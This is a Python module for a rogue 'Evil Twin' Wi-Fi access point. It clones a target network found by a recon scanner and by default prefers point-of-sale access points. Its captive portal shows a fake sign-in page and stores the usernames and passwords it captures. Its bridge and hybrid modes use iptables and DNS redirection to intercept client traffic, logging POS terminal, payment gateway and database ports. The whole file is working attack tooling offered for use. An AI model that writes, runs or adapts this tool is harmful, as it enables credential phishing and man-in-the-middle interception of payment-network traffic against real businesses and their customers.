"""
Rogue Access Point Engine (Evil Twin)
─────────────────────────────────────
Creates a rogue AP mimicking a target discovered by the recon scanner.

Modes of operation:
  CAPTIVE  — All traffic redirected to credential-harvesting portal
  BRIDGE   — Forward traffic to real network while intercepting (insecure segmentation)
  HYBRID   — First request hits portal, then bridge for ongoing interception

The bridge mode exploits insecure network segmentation by routing traffic
between the rogue AP network and the real network (via the monitor interface
or a separate uplink). This allows transparent MITM while clients believe
they have internet access.

Linux:  Uses hostapd + dnsmasq + iptables + ip forwarding
Windows: Uses netsh hosted network + DNS redirect + captive portal

Target SSID, channel, and MAC are pulled from the recon database.
"""

import os
import subprocess
import time
import threading
import http.server
import re
from urllib.parse import parse_qs

from scapy.all import RandMAC

from .config import (
    CAPTIVE_PORTAL_PORT, NETWORK_GW_IP, NETWORK_MASK,
    DHCP_LEASE, DNS_CONF_PATH, IS_WINDOWS, IS_LINUX, log,
)


# POS-specific ports to intercept/log
POS_PORTS = {
    80: "HTTP",
    443: "HTTPS",
    8080: "HTTP-Alt",
    8443: "HTTPS-Alt",
    3000: "POS-App",
    4100: "POS-Terminal",
    5555: "POS-Debug",
    8000: "POS-API",
    9100: "Receipt-Printer",
    20000: "POS-Comms",
    # Payment processor ports
    5000: "Payment-Gateway",
    7000: "Payment-API",
    8090: "Payment-Webhook",
    # Database ports (POS backends)
    3306: "MySQL",
    5432: "PostgreSQL",
    1433: "MSSQL",
    # Common POS vendor ports
    9001: "Clover-POS",
    9002: "Square-POS",
    8888: "Toast-POS",
}


class RogueAPEngine:
    """
    Evil Twin AP engine. All parameters can be auto-populated from recon data.

    Supports three modes:
      - 'captive': All traffic → credential portal (default)
      - 'bridge': Forward traffic to internet, intercept transparently
      - 'hybrid': Portal on first connect, then bridge after auth
    """

    def __init__(self, interface, ssid, channel, db, mac_address=None,
                 use_wpa=False, wpa_passphrase=None, mode="captive",
                 uplink_interface=None):
        # Input validation
        if not ssid or len(ssid) > 32:
            raise ValueError("SSID must be 1-32 characters")
        if not re.match(r'^[a-zA-Z0-9\s\-_.]*$', ssid):
            raise ValueError("SSID contains invalid characters")
        if use_wpa and wpa_passphrase:
            if len(wpa_passphrase) < 8 or len(wpa_passphrase) > 63:
                raise ValueError("WPA passphrase must be 8-63 characters")

        self.interface = interface
        self.ssid = ssid
        self.channel = str(channel)
        self.db = db
        self.mac_address = mac_address or str(RandMAC())
        self.use_wpa = use_wpa
        self.wpa_passphrase = wpa_passphrase
        self.mode = mode  # 'captive', 'bridge', 'hybrid'
        self.uplink_interface = uplink_interface  # Interface with internet access
        self._hostapd_proc = None
        self._dnsmasq_proc = None
        self._portal_server = None
        self._portal_thread = None
        self._arp_poison_thread = None
        self._traffic_logger_thread = None
        self.running = False
        self._authenticated_clients = set()  # For hybrid mode
        self._connected_clients = set()
        self._intercepted_data = []

    @classmethod
    def from_recon_db(cls, interface, db, target_bssid=None, mode="captive",
                      uplink_interface=None):
        """
        Factory: create a RogueAPEngine using data scanned by ReconEngine.
        If target_bssid is None, automatically picks the strongest POS AP.
        """
        if target_bssid:
            row = db.get_ap_by_bssid(target_bssid)
        else:
            row = db.get_strongest_pos_ap()
            if not row:
                row = db.get_strongest_ap()

        if not row:
            log.error("No target AP found in recon data")
            return None

        bssid = row[0]
        ssid = row[1] or "FreeWiFi"
        channel = row[2] or 6

        log.info(f"RogueAP auto-configured from recon: '{ssid}' ch {channel} "
                 f"(target {bssid}) mode={mode}")
        return cls(interface=interface, ssid=ssid, channel=channel, db=db,
                   mode=mode, uplink_interface=uplink_interface)

    def _write_hostapd_conf(self):
        conf_path = "/tmp/hostapd-rogue.conf"
        config = (
            f"interface={self.interface}\n"
            f"driver=nl80211\n"
            f"ssid={self.ssid}\n"
            f"hw_mode=g\n"
            f"channel={self.channel}\n"
            f"wmm_enabled=0\n"
            f"macaddr_acl=0\n"
            f"auth_algs=1\n"
            f"ignore_broadcast_ssid=0\n"
        )
        if self.use_wpa and self.wpa_passphrase:
            config += (
                f"wpa=2\n"
                f"wpa_passphrase={self.wpa_passphrase}\n"
                f"wpa_key_mgmt=WPA-PSK\n"
                f"rsn_pairwise=CCMP\n"
            )
        with open(conf_path, 'w') as f:
            f.write(config)
        return conf_path

    def _configure_interface(self):
        """Configure the AP interface with IP addressing (cross-platform)."""
        if IS_WINDOWS:
            subprocess.run(
                ["netsh", "wlan", "set", "hostednetwork",
                 f"mode=allow", f"ssid={self.ssid}", f"key=12345678"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        else:
            cmds = [
                ["ip", "link", "set", self.interface, "down"],
                ["ip", "link", "set", self.interface, "address", self.mac_address],
                ["ip", "link", "set", self.interface, "up"],
                ["ip", "addr", "flush", "dev", self.interface],
                ["ip", "addr", "add", f"{NETWORK_GW_IP}/24", "dev", self.interface],
            ]
            for cmd in cmds:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        time.sleep(0.5)

    def _enable_ip_forwarding(self):
        """Enable kernel IP forwarding for bridge/hybrid modes."""
        if IS_LINUX:
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1")
                log.info("IP forwarding enabled")
            except (IOError, PermissionError):
                subprocess.run(
                    ["sysctl", "-w", "net.ipv4.ip_forward=1"],
                    capture_output=True, timeout=5)

    def _start_dnsmasq(self):
        """Start DNS/DHCP — configuration depends on mode."""
        if IS_WINDOWS:
            log.info("Windows mode: DHCP handled by hosted network")
            return

        if self.mode == "bridge":
            # Bridge mode: use real upstream DNS, only provide DHCP
            # This makes clients think they have real internet
            config = (
                f"interface={self.interface}\n"
                f"dhcp-range={DHCP_LEASE}\n"
                f"dhcp-option=option:router,{NETWORK_GW_IP}\n"
                f"dhcp-option=option:dns-server,{NETWORK_GW_IP}\n"
                f"server=8.8.8.8\n"
                f"server=8.8.4.4\n"
                f"log-queries\n"
                f"log-facility=/tmp/dnsmasq-rogue.log\n"
            )
        elif self.mode == "hybrid":
            # Hybrid: wildcard DNS until authenticated, then real DNS
            config = (
                f"no-resolv\n"
                f"interface={self.interface}\n"
                f"dhcp-range={DHCP_LEASE}\n"
                f"dhcp-option=option:router,{NETWORK_GW_IP}\n"
                f"dhcp-option=option:dns-server,{NETWORK_GW_IP}\n"
                f"address=/#/{NETWORK_GW_IP}\n"
                f"log-queries\n"
                f"log-facility=/tmp/dnsmasq-rogue.log\n"
            )
        else:
            # Captive mode: wildcard DNS → portal
            config = (
                f"no-resolv\n"
                f"interface={self.interface}\n"
                f"dhcp-range={DHCP_LEASE}\n"
                f"address=/#/{NETWORK_GW_IP}\n"
            )

        with open(DNS_CONF_PATH, 'w') as f:
            f.write(config)
        self._dnsmasq_proc = subprocess.Popen(
            ["dnsmasq", "-C", DNS_CONF_PATH, "-d"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log.info(f"dnsmasq started (mode={self.mode})")

    def _setup_iptables(self):
        """Set up traffic rules based on AP mode."""
        if IS_WINDOWS:
            rules = [
                f"netsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 "
                f"connectport={CAPTIVE_PORTAL_PORT} connectaddress={NETWORK_GW_IP}",
                f"netsh interface portproxy add v4tov4 listenport=443 listenaddress=0.0.0.0 "
                f"connectport={CAPTIVE_PORTAL_PORT} connectaddress={NETWORK_GW_IP}",
            ]
            for rule in rules:
                subprocess.run(rule.split(), stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL, timeout=5)
            return

        # Flush existing rules
        subprocess.run("iptables -F".split(), stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=5)
        subprocess.run("iptables -t nat -F".split(), stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=5)

        if self.mode == "bridge":
            # BRIDGE MODE: Forward all traffic to internet, but log/intercept
            # Enable NAT masquerading so rogue clients can reach real network
            self._enable_ip_forwarding()
            uplink = self.uplink_interface or self._detect_uplink()
            rules = [
                # NAT masquerade outbound traffic through uplink
                f"iptables -t nat -A POSTROUTING -o {uplink} -j MASQUERADE",
                # Allow forwarding between AP and uplink
                f"iptables -A FORWARD -i {self.interface} -o {uplink} -j ACCEPT",
                f"iptables -A FORWARD -i {uplink} -o {self.interface} "
                f"-m state --state ESTABLISHED,RELATED -j ACCEPT",
                # Redirect DNS to us (for selective spoofing)
                f"iptables -t nat -A PREROUTING -i {self.interface} -p udp --dport 53 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:53",
                # Log POS-specific ports for analysis
                f"iptables -A FORWARD -i {self.interface} -p tcp -m multiport "
                f"--dports 9100,4100,5555,3000,8080 -j LOG --log-prefix 'POS-TRAFFIC: '",
                # Redirect HTTP for credential interception (transparent proxy)
                f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 80 "
                f"-j REDIRECT --to-port {CAPTIVE_PORTAL_PORT}",
            ]
            for rule in rules:
                subprocess.run(rule.split(), stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL, timeout=5)
            log.info(f"Bridge mode iptables configured (uplink: {uplink})")

        elif self.mode == "hybrid":
            # HYBRID MODE: Portal first, then bridge after authentication
            self._enable_ip_forwarding()
            uplink = self.uplink_interface or self._detect_uplink()
            rules = [
                # NAT for forwarding
                f"iptables -t nat -A POSTROUTING -o {uplink} -j MASQUERADE",
                f"iptables -A FORWARD -i {self.interface} -o {uplink} -j ACCEPT",
                f"iptables -A FORWARD -i {uplink} -o {self.interface} "
                f"-m state --state ESTABLISHED,RELATED -j ACCEPT",
                # DNS redirect (for spoofing)
                f"iptables -t nat -A PREROUTING -i {self.interface} -p udp --dport 53 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:53",
                # HTTP/HTTPS redirect to portal (initially for all clients)
                f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 80 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:{CAPTIVE_PORTAL_PORT}",
                f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 443 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:{CAPTIVE_PORTAL_PORT}",
            ]
            for rule in rules:
                subprocess.run(rule.split(), stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL, timeout=5)
            log.info(f"Hybrid mode iptables configured (uplink: {uplink})")

        else:
            # CAPTIVE MODE: All traffic → portal
            rules = [
                f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 80 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:{CAPTIVE_PORTAL_PORT}",
                f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 443 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:{CAPTIVE_PORTAL_PORT}",
                f"iptables -t nat -A PREROUTING -i {self.interface} -p udp --dport 53 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:53",
                f"iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 53 "
                f"-j DNAT --to-destination {NETWORK_GW_IP}:53",
            ]
            for rule in rules:
                subprocess.run(rule.split(), stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL, timeout=5)
            log.info("Captive mode iptables configured")

    def _detect_uplink(self):
        """Auto-detect the interface with internet access (for bridge/hybrid)."""
        try:
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                # Parse: "default via 192.168.1.1 dev eth0 ..."
                match = re.search(r"dev\s+(\S+)", result.stdout)
                if match:
                    uplink = match.group(1)
                    # Don't return our own AP interface
                    if uplink != self.interface:
                        log.info(f"Detected uplink interface: {uplink}")
                        return uplink
        except (subprocess.TimeoutExpired, OSError):
            pass

        # Fallback: try common names
        for name in ["eth0", "enp0s3", "wlan0", "wlp2s0"]:
            if name != self.interface and os.path.exists(f"/sys/class/net/{name}"):
                return name

        log.warning("Could not detect uplink interface, using eth0")
        return "eth0"

    def _release_client_from_portal(self, client_ip):
        """
        Release a client from portal captivity (hybrid mode).
        Remove the redirect rules for this specific client IP so they get
        real internet while we continue intercepting.
        """
        if self.mode != "hybrid":
            return

        rules = [
            f"iptables -t nat -I PREROUTING -i {self.interface} -s {client_ip} "
            f"-p tcp --dport 80 -j ACCEPT",
            f"iptables -t nat -I PREROUTING -i {self.interface} -s {client_ip} "
            f"-p tcp --dport 443 -j ACCEPT",
        ]
        for rule in rules:
            subprocess.run(rule.split(), stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL, timeout=5)
        self._authenticated_clients.add(client_ip)
        log.info(f"Client {client_ip} released from portal → bridged (still intercepting)")

    def _start_captive_portal(self):
        db_ref = self.db
        ssid_ref = self.ssid
        engine_ref = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(self._page().encode())

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode(errors='ignore')
                params = parse_qs(body)
                username = params.get("username", params.get("email", [""]))[0]
                password = params.get("password", params.get("pass", params.get("pwd", [""])))[0]
                if username or password:
                    db_ref.log_credential(self.client_address[0], "", username, password, self.path)
                    log.info(f"CREDENTIAL: {username}:{'*' * len(password)} "
                             f"from {self.client_address[0]}")

                # In hybrid mode, release client after credential capture
                engine_ref._release_client_from_portal(self.client_address[0])

                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(b'<html><body><h1>Connected</h1>'
                                 b'<p>You are now connected to the network.</p>'
                                 b'<script>setTimeout(function(){window.location="http://www.google.com"},2000)</script>'
                                 b'</body></html>')

            def _page(self):
                return (
                    '<!DOCTYPE html><html><head><meta charset="utf-8">'
                    '<meta name="viewport" content="width=device-width,initial-scale=1">'
                    f'<title>{ssid_ref} - Sign In</title><style>'
                    '*{margin:0;padding:0;box-sizing:border-box}'
                    'body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;'
                    'background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}'
                    '.c{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.1);'
                    'padding:48px 40px;max-width:400px;width:90%}'
                    'h1{font-size:22px;margin-bottom:8px}p{color:#666;margin-bottom:24px;font-size:14px}'
                    'label{display:block;font-size:13px;font-weight:600;margin-bottom:6px}'
                    'input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;'
                    'font-size:15px;margin-bottom:16px}'
                    'button{width:100%;padding:14px;background:#0066ff;color:#fff;border:none;'
                    'border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}'
                    '</style></head><body><div class="c">'
                    f'<h1>Welcome to {ssid_ref}</h1>'
                    '<p>Sign in to access the network.</p>'
                    '<form method="POST" action="/login">'
                    '<label>Email or Username</label>'
                    '<input type="text" name="username" required>'
                    '<label>Password</label>'
                    '<input type="password" name="password" required>'
                    '<button type="submit">Sign In</button>'
                    '</form></div></body></html>'
                )

        server = http.server.HTTPServer((NETWORK_GW_IP, CAPTIVE_PORTAL_PORT), Handler)
        self._portal_server = server
        self._portal_thread = threading.Thread(target=server.serve_forever, daemon=True)
        self._portal_thread.start()
        log.info(f"Captive portal on {NETWORK_GW_IP}:{CAPTIVE_PORTAL_PORT}")

    def _start_traffic_logger(self):
        """
        Background thread that monitors connected clients and logs
        POS-specific protocol traffic for analysis.
        """
        def _monitor():
            while self.running:
                # Check for new DHCP leases (connected clients)
                self._poll_connected_clients()
                time.sleep(5)

        self._traffic_logger_thread = threading.Thread(
            target=_monitor, daemon=True, name="traffic-logger")
        self._traffic_logger_thread.start()

    def _poll_connected_clients(self):
        """Check dnsmasq lease file for connected clients."""
        lease_file = "/var/lib/misc/dnsmasq.leases"
        if not os.path.isfile(lease_file):
            lease_file = "/tmp/dnsmasq.leases"
        if not os.path.isfile(lease_file):
            return

        try:
            with open(lease_file, "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 4:
                        mac = parts[1]
                        ip = parts[2]
                        hostname = parts[3] if len(parts) > 3 else ""
                        if mac not in self._connected_clients:
                            self._connected_clients.add(mac)
                            log.info(f"  CLIENT CONNECTED to rogue AP: "
                                     f"{mac} ({ip}) hostname={hostname}")
        except (IOError, OSError):
            pass

    def start(self):
        """Start the rogue AP with proper error handling and rollback."""
        try:
            self.running = True
            log.info(f"Configuring interface {self.interface} (mode={self.mode})...")
            self._configure_interface()

            if IS_WINDOWS:
                log.info("Starting Windows hosted network...")
                result = subprocess.run(
                    ["netsh", "wlan", "start", "hostednetwork"],
                    capture_output=True, text=True, timeout=10)
                if result.returncode != 0:
                    log.error(f"Hosted network failed: {result.stderr.strip()}")
                    log.info("Falling back to captive portal only mode")
                else:
                    log.info(f"Windows hosted network '{self.ssid}' started")
            else:
                conf_path = self._write_hostapd_conf()
                log.info("Starting hostapd...")
                self._hostapd_proc = subprocess.Popen(
                    ["hostapd", conf_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE)
                time.sleep(2)
                if self._hostapd_proc.poll() is not None:
                    log.error("hostapd failed to start")
                    stderr_output = self._hostapd_proc.stderr.read().decode() if self._hostapd_proc.stderr else ""
                    log.error(f"hostapd error: {stderr_output}")
                    self.running = False
                    self.stop()
                    return False
                log.info(f"Rogue AP '{self.ssid}' active on {self.interface} ch {self.channel}")

            log.info("Starting dnsmasq...")
            self._start_dnsmasq()

            log.info("Configuring traffic rules...")
            self._setup_iptables()

            log.info("Starting captive portal...")
            self._start_captive_portal()

            # Start traffic monitoring
            self._start_traffic_logger()

            log.info(f"Rogue AP started: {self.ssid} ch{self.channel} mode={self.mode}")
            return True
        except Exception as e:
            log.error(f"Rogue AP startup failed: {e}")
            self.running = False
            self.stop()
            return False

    def stop(self):
        self.running = False
        if self._portal_server:
            self._portal_server.shutdown()

        if IS_WINDOWS:
            subprocess.run(["netsh", "wlan", "stop", "hostednetwork"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("netsh interface portproxy reset".split(),
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            if self._hostapd_proc:
                self._hostapd_proc.terminate()
                try:
                    self._hostapd_proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self._hostapd_proc.kill()
            if self._dnsmasq_proc:
                self._dnsmasq_proc.terminate()
                try:
                    self._dnsmasq_proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self._dnsmasq_proc.kill()
            # Restore iptables and IP forwarding
            subprocess.run("iptables -F".split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("iptables -t nat -F".split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("iptables -P FORWARD DROP".split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("0")
            except (IOError, PermissionError):
                pass
            for f in ["/tmp/hostapd-rogue.conf", DNS_CONF_PATH, "/tmp/dnsmasq-rogue.log"]:
                if os.path.isfile(f):
                    os.remove(f)

        log.info(f"Rogue AP torn down (served {len(self._connected_clients)} clients)")
